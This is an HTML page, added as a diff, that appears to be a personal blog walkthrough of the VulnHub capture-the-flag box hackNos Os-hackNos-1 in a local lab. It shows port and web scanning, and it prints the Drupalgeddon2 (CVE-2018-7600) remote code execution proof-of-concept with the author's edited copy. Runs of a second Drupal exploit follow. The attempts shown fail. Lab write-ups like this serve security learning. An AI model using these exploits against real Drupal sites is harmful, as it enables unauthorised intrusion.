@@ -1,0 +1,946 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>
+/f0c1s/blog/sec/vulnhub/hackNos-os-hackNos-1
+</title>
+<link rel="stylesheet" href="../../../index.css"/> <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script src="../../../setup.js"></script>
+<script>hljs.highlightAll();</script>
+</head>
+<body onload="setup()">
+<h1>
+/f0c1s/blog/sec/vulnhub/hackNos-os-hackNos-1
+</h1>
+<nav>
+<a href="../../../index.html">/blog</a> <a href="../../index.html">Security</a> <a href="../index.html">VulnHub</a> <a href="../../../sec/vulnhub/hackNos-os-hackNos-1/hackNos-os-hackNos-1.html">+ hackNos: Os-hackNos 1 - 2022.01.03 Monday</a>
+</nav>
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Difficulty : Easy to Intermediate</p>
+<p>Flag : 2 Flag first user And second root</p>
+<p>Learning : exploit | Web Application | Enumeration | Privilege Escalation</p>
+<p>Website : www.hackNos.com</p>
+<p>mail : contact@hackNos.com</p>
+</blockquote>
+<p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a> <a href="https://www.vulnhub.com/series/hacknos,257/">Series: https://www.vulnhub.com/series/hacknos,257/</a></p>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.87
+</code></pre>
+<pre class="shell"><code>export RHOST=&quot;192.168.56.87&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+</code></pre>
+<pre class="shell"><code>_n $RHOST
+firing nmap 192.168.56.87 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:53 IST
+Nmap scan report for 192.168.56.87
+Host is up (0.00020s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
+</code></pre>
+<pre class="shell"><code>_ntd $RHOST
+firing nmap 192.168.56.87 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:53 IST
+Nmap scan report for 192.168.56.87
+Host is up (0.00017s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
+|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
+|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
+</code></pre>
+<figure>
+<img src="1.scanning.png" alt="" /><figcaption>1.scanning</figcaption>
+</figure>
+<pre class="shell"><code>sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:54 IST
+Nmap scan report for 192.168.56.87
+Host is up (0.00050s latency).
+All 100 scanned ports on 192.168.56.87 are in ignored states.
+Not shown: 98 open|filtered udp ports (no-response), 2 closed udp ports (port-unreach)
+MAC Address: 08:00:27:F4:05:5D (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
+</code></pre>
+<p>Only two ports are exposed, both are TCP and there is no UDP port available for to public.</p>
+<p>The ports are default for web and ssh.</p>
+<h2 id="attacking-web">Attacking web</h2>
+<p>Web first because I do not have user:pass for SSH yet.</p>
+<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.87
++ Target Hostname:    192.168.56.87
++ Target Port:        80
++ Start Time:         2022-01-03 08:55:43 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59633974a1f12, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26522 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-01-03 08:57:01 (GMT5.5) (78 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
+301        9l       28w      315c http://192.168.56.87/drupal
+301        9l       28w      320c http://192.168.56.87/drupal/misc
+301        9l       28w      322c http://192.168.56.87/drupal/themes
+301        9l       28w      323c http://192.168.56.87/drupal/modules
+301        9l       28w      323c http://192.168.56.87/drupal/scripts
+301        9l       28w      321c http://192.168.56.87/drupal/sites
+301        9l       28w      324c http://192.168.56.87/drupal/includes
+301        9l       28w      324c http://192.168.56.87/drupal/profiles
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_87-1641180584.state ...
+Scanning: http://192.168.56.87
+Scanning: http://192.168.56.87/drupal
+</code></pre>
+<figure>
+<img src="2.homepage.png" alt="" /><figcaption>2.homepage</figcaption>
+</figure>
+<figure>
+<img src="3.drupal.png" alt="" /><figcaption>3.drupal</figcaption>
+</figure>
+<pre class="shell"><code>droopescan scan drupal -u http://$RHOST/drupal -t 16
+[+] Plugins found:
+    profile http://192.168.56.87/drupal/modules/profile/
+    php http://192.168.56.87/drupal/modules/php/
+    image http://192.168.56.87/drupal/modules/image/
+
+[+] Themes found:
+    seven http://192.168.56.87/drupal/themes/seven/
+    garland http://192.168.56.87/drupal/themes/garland/
+
+[+] Possible version(s):
+    7.57
+
+[+] Possible interesting urls found:
+    Default changelog file - http://192.168.56.87/drupal/CHANGELOG.txt
+
+[+] Scan finished (0:00:05.324522 elapsed)
+</code></pre>
+<figure>
+<img src="4.changelog.png" alt="" /><figcaption>4.changelog</figcaption>
+</figure>
+<h2 id="drupal-exploits">Drupal exploits</h2>
+<pre class="shell"><code>searchsploit Drupal 7.57 | grep -i remote
+Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code (Metasploit)         | php/webapps/44557.rb
+Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code Execution (PoC)      | php/webapps/44542.txt
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execut | php/webapps/44449.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution (Meta | php/remote/44482.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution (PoC) | php/webapps/44448.py
+Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize() Remote Command E | php/remote/46510.rb
+Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                   | php/webapps/46452.txt
+Drupal &lt; 8.6.9 - REST Module Remote Code Execution                               | php/webapps/46459.py
+</code></pre>
+<figure>
+<img src="5.searchsploit-drupal.png" alt="" /><figcaption>5.searchsploit-drupal</figcaption>
+</figure>
+<p>Well, metasploit doesn’t work.</p>
+<figure>
+<img src="6.no-msf.png" alt="" /><figcaption>6.no-msf</figcaption>
+</figure>
+<h3 id="manual-attempt">manual attempt</h3>
+<pre class="shell"><code>searchsploit -m php/webapps/44448.py
+  Exploit: Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution (PoC)
+      URL: https://www.exploit-db.com/exploits/44448
+     Path: /usr/share/exploitdb/exploits/php/webapps/44448.py
+File Type: a /usr/bin/env script, ASCII text executable
+
+Copied to: /home/f0c1s/vuln-hubs/hackNos/os-hackNos-1/44448.py
+</code></pre>
+<h3 id="cat-44448.py"><code>cat 44448.py</code></h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="co">#!/usr/bin/env</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="im">import</span> sys</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="im">import</span> requests</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;################################################################&#39;</span>)</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;# Proof-Of-Concept for CVE-2018-7600&#39;</span>)</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;# by Vitalii Rudnykh&#39;</span>)</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;</span>)</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;# https://github.com/a2u/CVE-2018-7600&#39;</span>)</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;################################################################&#39;</span>)</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;Provided only for educational or information purposes</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true"></a></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true"></a>target <span class="op">=</span> <span class="bu">input</span>(<span class="st">&#39;Enter target url (example: https://domain.ltd/): &#39;</span>)</span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true"></a></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true"></a><span class="co"># Add proxy support (eg. BURP to analyze HTTP(s) traffic)</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true"></a><span class="co"># set verify = False if your proxy certificate is self signed</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true"></a><span class="co"># remember to set proxies both for http and https</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true"></a><span class="co">#</span></span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true"></a><span class="co"># example:</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true"></a><span class="co"># proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;}</span></span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true"></a><span class="co"># verify = False</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true"></a>proxies <span class="op">=</span> {}</span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true"></a>verify <span class="op">=</span> <span class="va">True</span></span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true"></a></span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true"></a>url <span class="op">=</span> target <span class="op">+</span> <span class="st">&#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39;</span></span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true"></a>payload <span class="op">=</span> {<span class="st">&#39;form_id&#39;</span>: <span class="st">&#39;user_register_form&#39;</span>, <span class="st">&#39;_drupal_ajax&#39;</span>: <span class="st">&#39;1&#39;</span>, <span class="st">&#39;mail[#post_render][]&#39;</span>: <span class="st">&#39;exec&#39;</span>, <span class="st">&#39;mail[#type]&#39;</span>: <span class="st">&#39;markup&#39;</span>, <span class="st">&#39;mail[#markup]&#39;</span>: <span class="st">&#39;echo &quot;;-)&quot; | tee hello.txt&#39;</span>}</span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true"></a></span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true"></a>r <span class="op">=</span> requests.post(url, proxies<span class="op">=</span>proxies, data<span class="op">=</span>payload, verify<span class="op">=</span>verify)</span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true"></a>check <span class="op">=</span> requests.get(target <span class="op">+</span> <span class="st">&#39;hello.txt&#39;</span>)</span>
+<span id="cb11-30"><a href="#cb11-30" aria-hidden="true"></a><span class="cf">if</span> check.status_code <span class="op">!=</span> <span class="dv">200</span>:</span>
+<span id="cb11-31"><a href="#cb11-31" aria-hidden="true"></a>  sys.exit(<span class="st">&quot;Not exploitable&quot;</span>)</span>
+<span id="cb11-32"><a href="#cb11-32" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;</span><span class="ch">\n</span><span class="st">Check: &#39;</span><span class="op">+</span>target<span class="op">+</span><span class="st">&#39;hello.txt&#39;</span>)</span></code></pre></div>
+<p>Updated code</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="im">import</span> sys</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a><span class="im">import</span> requests</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a>target <span class="op">=</span> <span class="st">&quot;http://192.168.56.87/drupal&quot;</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a>proxies <span class="op">=</span> {}</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a>verify <span class="op">=</span> <span class="va">True</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a>url <span class="op">=</span> target <span class="op">+</span> <span class="st">&#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39;</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a>payload <span class="op">=</span> {<span class="st">&#39;form_id&#39;</span>: <span class="st">&#39;user_register_form&#39;</span>, <span class="st">&#39;_drupal_ajax&#39;</span>: <span class="st">&#39;1&#39;</span>, <span class="st">&#39;mail[#post_render][]&#39;</span>: <span class="st">&#39;exec&#39;</span>, <span class="st">&#39;mail[#type]&#39;</span>: <span class="st">&#39;markup&#39;</span>, <span class="st">&#39;mail[#markup]&#39;</span>: <span class="st">&#39;echo &quot;;-)&quot; | tee hello.txt&#39;</span>}</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true"></a></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true"></a>r <span class="op">=</span> requests.post(url, proxies<span class="op">=</span>proxies, data<span class="op">=</span>payload, verify<span class="op">=</span>verify)</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true"></a>check <span class="op">=</span> requests.get(target <span class="op">+</span> <span class="st">&#39;hello.txt&#39;</span>)</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true"></a><span class="cf">if</span> check.status_code <span class="op">!=</span> <span class="dv">200</span>:</span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true"></a>  sys.exit(<span class="st">&quot;Not exploitable&quot;</span>)</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true"></a><span class="bu">print</span> (<span class="st">&#39;</span><span class="ch">\n</span><span class="st">Check: &#39;</span><span class="op">+</span>target<span class="op">+</span><span class="st">&#39;hello.txt&#39;</span>)</span></code></pre></div>
+<pre class="shell"><code>python3 44448.py
+Not exploitable
+</code></pre>
+<h3 id="cve-2018-7600">CVE-2018-7600</h3>
+<pre class="shell"><code>python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal
+
+=============================================================================
+|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+[*] Poisoned form ID: form-nVk5DXSc9O6pcjA7MVYzichuxXHkaz_LAK6Bl6-xS0M
+[*] Triggering exploit to execute: id
+
+</code></pre>
+<pre class="shell"><code>python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal -c &quot;whoami&quot;
+
+=============================================================================
+|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+[*] Poisoned form ID: form-wkl86VNbMU3UIhhv5BSittLhPGTY3uPQTGgYWkFzZto
+[*] Triggering exploit to execute: whoami
+
+</code></pre>
+<p>Oh well. I will keep looking I guess.</p>
+<h2 id="back-to-web">Back to web</h2>
+<figure>
+<img src="7.sites.png" alt="" /><figcaption>7.sites</figcaption>
+</figure>
+<figure>
+<img src="8.drupal-profiles.png" alt="" /><figcaption>8.drupal-profiles</figcaption>
+</figure>
+<figure>
+<img src="9.drupal-includes.png" alt="" /><figcaption>9.drupal-includes</figcaption>
+</figure>
+<figure>
+<img src="10.drupal-scripts.png" alt="" /><figcaption>10.drupal-scripts</figcaption>
+</figure>
+<figure>
+<img src="11.potential-file-inclusion-with-null-byte.png" alt="" /><figcaption>11.potential-file-inclusion-with-null-byte</figcaption>
+</figure>
+<figure>
+<img src="12.drupal-themes.png" alt="" /><figcaption>12.drupal-themes</figcaption>
+</figure>
+<h2 id="more-scanning">more scanning</h2>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST/drupal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
+301        9l       28w      320c http://192.168.56.87/drupal/misc
+301        9l       28w      322c http://192.168.56.87/drupal/themes
+301        9l       28w      323c http://192.168.56.87/drupal/modules
+301        9l       28w      328c http://192.168.56.87/drupal/modules/blog
+301        9l       28w      329c http://192.168.56.87/drupal/modules/forum
+301        9l       28w      331c http://192.168.56.87/drupal/modules/profile
+301        9l       28w      328c http://192.168.56.87/drupal/modules/user
+301        9l       28w      329c http://192.168.56.87/drupal/modules/image
+301        9l       28w      323c http://192.168.56.87/drupal/scripts
+301        9l       28w      328c http://192.168.56.87/drupal/modules/menu
+301        9l       28w      327c http://192.168.56.87/drupal/modules/php
+301        9l       28w      328c http://192.168.56.87/drupal/modules/node
+301        9l       28w      328c http://192.168.56.87/drupal/modules/book
+301        9l       28w      324c http://192.168.56.87/drupal/includes
+301        9l       28w      328c http://192.168.56.87/drupal/modules/poll
+301        9l       28w      324c http://192.168.56.87/drupal/profiles
+301        9l       28w      331c http://192.168.56.87/drupal/modules/contact
+301        9l       28w      330c http://192.168.56.87/drupal/modules/search
+301        9l       28w      328c http://192.168.56.87/drupal/modules/help
+301        9l       28w      321c http://192.168.56.87/drupal/sites
+301        9l       28w      331c http://192.168.56.87/drupal/modules/tracker
+301        9l       28w      330c http://192.168.56.87/drupal/modules/system
+301        9l       28w      331c http://192.168.56.87/drupal/modules/comment
+301        9l       28w      328c http://192.168.56.87/drupal/modules/file
+301        9l       28w      330c http://192.168.56.87/drupal/modules/update
+301        9l       28w      331c http://192.168.56.87/drupal/modules/toolbar
+301        9l       28w      334c http://192.168.56.87/drupal/modules/statistics
+301        9l       28w      332c http://192.168.56.87/drupal/modules/taxonomy
+301        9l       28w      327c http://192.168.56.87/drupal/modules/rdf
+301        9l       28w      323c http://192.168.56.87/drupal/misc/ui
+301        9l       28w      330c http://192.168.56.87/drupal/modules/filter
+301        9l       28w      334c http://192.168.56.87/drupal/modules/aggregator
+301        9l       28w      329c http://192.168.56.87/drupal/modules/block
+301        9l       28w      335c http://192.168.56.87/drupal/modules/translation
+301        9l       28w      329c http://192.168.56.87/drupal/modules/color
+301        9l       28w      333c http://192.168.56.87/drupal/modules/dashboard
+301        9l       28w      330c http://192.168.56.87/drupal/modules/syslog
+301        9l       28w      330c http://192.168.56.87/drupal/modules/locale
+301        9l       28w      329c http://192.168.56.87/drupal/modules/field
+301        9l       28w      328c http://192.168.56.87/drupal/modules/path
+301        9l       28w      328c http://192.168.56.87/drupal/themes/seven
+301        9l       28w      330c http://192.168.56.87/drupal/themes/engines
+301        9l       28w      330c http://192.168.56.87/drupal/modules/openid
+301        9l       28w      332c http://192.168.56.87/drupal/modules/shortcut
+Scanning: http://192.168.56.87/drupal/
+Scanning: http://192.168.56.87/drupal/misc
+Scanning: http://192.168.56.87/drupal/themes
+Scanning: http://192.168.56.87/drupal/modules
+Scanning: http://192.168.56.87/drupal/scripts
+Scanning: http://192.168.56.87/drupal/includes
+Scanning: http://192.168.56.87/drupal/profiles
+Scanning: http://192.168.56.87/drupal/sites
+^C</code></pre>
+<pre class="shell"><code>python3 ~/collected-tools/drupwn/drupwn --mode enum  --target http://$RHOST/drupal
+
+        ____
+       / __ \_______  ______ _      ______
+      / / / / ___/ / / / __ \ | /| / / __ \
+     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
+    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
+                     /_/
+
+[-] Version not specified, trying to identify it
+
+[+] Version detected: 7.57
+
+
+============ Modules ============
+
+
+============ Themes ============
+
+
+============ Users ============
+
+
+============ Nodes ============
+
+
+============ Default files ============
+
+[+] /README.txt (200)
+[+] /robots.txt (200)
+[+] /LICENSE.txt (200)
+[+] /web.config (200)
+[+] /xmlrpc.php (200)
+[+] /update.php (403)
+[+] /install.php (200)
+</code></pre>
+<h3 id="drupalrobots.txt">/drupal/robots.txt</h3>
+<div class="sourceCode" id="cb18"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>#</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a># robots.txt</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a>#</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a># This file is to prevent the crawling and indexing of certain parts</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a># of your site by web crawlers and spiders run by sites like Yahoo!</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true"></a># and Google. By telling these &quot;robots&quot; where not to go on your site,</span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true"></a># you save bandwidth and server resources.</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true"></a>#</span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true"></a># This file will be ignored unless it is at the root of your host:</span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true"></a># Used:    http://example.com/robots.txt</span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true"></a># Ignored: http://example.com/site/robots.txt</span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true"></a>#</span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true"></a># For more information about the robots.txt standard, see:</span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true"></a># http://www.robotstxt.org/robotstxt.html</span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true"></a></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true"></a>User-agent: *</span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true"></a>Crawl-delay: 10</span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true"></a># CSS, JS, Images</span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true"></a>Allow: /misc/*.css$</span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true"></a>Allow: /misc/*.css?</span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true"></a>Allow: /misc/*.js$</span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true"></a>Allow: /misc/*.js?</span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true"></a>Allow: /misc/*.gif</span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true"></a>Allow: /misc/*.jpg</span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true"></a>Allow: /misc/*.jpeg</span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true"></a>Allow: /misc/*.png</span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true"></a>Allow: /modules/*.css$</span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true"></a>Allow: /modules/*.css?</span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true"></a>Allow: /modules/*.js$</span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true"></a>Allow: /modules/*.js?</span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true"></a>Allow: /modules/*.gif</span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true"></a>Allow: /modules/*.jpg</span>
+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true"></a>Allow: /modules/*.jpeg</span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true"></a>Allow: /modules/*.png</span>
+<span id="cb18-35"><a href="#cb18-35" aria-hidden="true"></a>Allow: /profiles/*.css$</span>
+<span id="cb18-36"><a href="#cb18-36" aria-hidden="true"></a>Allow: /profiles/*.css?</span>
+<span id="cb18-37"><a href="#cb18-37" aria-hidden="true"></a>Allow: /profiles/*.js$</span>
+<span id="cb18-38"><a href="#cb18-38" aria-hidden="true"></a>Allow: /profiles/*.js?</span>
+<span id="cb18-39"><a href="#cb18-39" aria-hidden="true"></a>Allow: /profiles/*.gif</span>
+<span id="cb18-40"><a href="#cb18-40" aria-hidden="true"></a>Allow: /profiles/*.jpg</span>
+<span id="cb18-41"><a href="#cb18-41" aria-hidden="true"></a>Allow: /profiles/*.jpeg</span>
+<span id="cb18-42"><a href="#cb18-42" aria-hidden="true"></a>Allow: /profiles/*.png</span>
+<span id="cb18-43"><a href="#cb18-43" aria-hidden="true"></a>Allow: /themes/*.css$</span>
+<span id="cb18-44"><a href="#cb18-44" aria-hidden="true"></a>Allow: /themes/*.css?</span>
+<span id="cb18-45"><a href="#cb18-45" aria-hidden="true"></a>Allow: /themes/*.js$</span>
+<span id="cb18-46"><a href="#cb18-46" aria-hidden="true"></a>Allow: /themes/*.js?</span>
+<span id="cb18-47"><a href="#cb18-47" aria-hidden="true"></a>Allow: /themes/*.gif</span>
+<span id="cb18-48"><a href="#cb18-48" aria-hidden="true"></a>Allow: /themes/*.jpg</span>
+<span id="cb18-49"><a href="#cb18-49" aria-hidden="true"></a>Allow: /themes/*.jpeg</span>
+<span id="cb18-50"><a href="#cb18-50" aria-hidden="true"></a>Allow: /themes/*.png</span>
+<span id="cb18-51"><a href="#cb18-51" aria-hidden="true"></a># Directories</span>
+<span id="cb18-52"><a href="#cb18-52" aria-hidden="true"></a>Disallow: /includes/</span>
+<span id="cb18-53"><a href="#cb18-53" aria-hidden="true"></a>Disallow: /misc/</span>
+<span id="cb18-54"><a href="#cb18-54" aria-hidden="true"></a>Disallow: /modules/</span>
+<span id="cb18-55"><a href="#cb18-55" aria-hidden="true"></a>Disallow: /profiles/</span>
+<span id="cb18-56"><a href="#cb18-56" aria-hidden="true"></a>Disallow: /scripts/</span>
+<span id="cb18-57"><a href="#cb18-57" aria-hidden="true"></a>Disallow: /themes/</span>
+<span id="cb18-58"><a href="#cb18-58" aria-hidden="true"></a># Files</span>
+<span id="cb18-59"><a href="#cb18-59" aria-hidden="true"></a>Disallow: /CHANGELOG.txt</span>
+<span id="cb18-60"><a href="#cb18-60" aria-hidden="true"></a>Disallow: /cron.php</span>
+<span id="cb18-61"><a href="#cb18-61" aria-hidden="true"></a>Disallow: /INSTALL.mysql.txt</span>
+<span id="cb18-62"><a href="#cb18-62" aria-hidden="true"></a>Disallow: /INSTALL.pgsql.txt</span>
+<span id="cb18-63"><a href="#cb18-63" aria-hidden="true"></a>Disallow: /INSTALL.sqlite.txt</span>
+<span id="cb18-64"><a href="#cb18-64" aria-hidden="true"></a>Disallow: /install.php</span>
+<span id="cb18-65"><a href="#cb18-65" aria-hidden="true"></a>Disallow: /INSTALL.txt</span>
+<span id="cb18-66"><a href="#cb18-66" aria-hidden="true"></a>Disallow: /LICENSE.txt</span>
